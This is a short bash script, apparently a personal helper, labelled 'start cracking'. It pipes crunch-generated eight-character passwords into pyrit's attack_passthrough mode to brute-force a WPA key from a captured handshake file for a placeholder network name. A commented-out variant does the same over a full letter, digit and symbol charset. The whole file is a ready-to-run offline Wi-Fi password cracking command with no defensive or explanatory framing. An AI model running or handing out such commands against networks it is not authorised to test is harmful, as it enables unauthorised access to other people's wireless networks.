#!/bin/bash
#start cracking

screen -D -RR

crunch 8 8 | pyrit -r FILE.cap -e WLAN-SSID -i - attack_passthrough
#OR
#crunch 8 8 abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\!\@\#\$\%\^\&\*\.\(\) | pyrit FILE.cap -e WLAN-SSID -i - attack_passthrough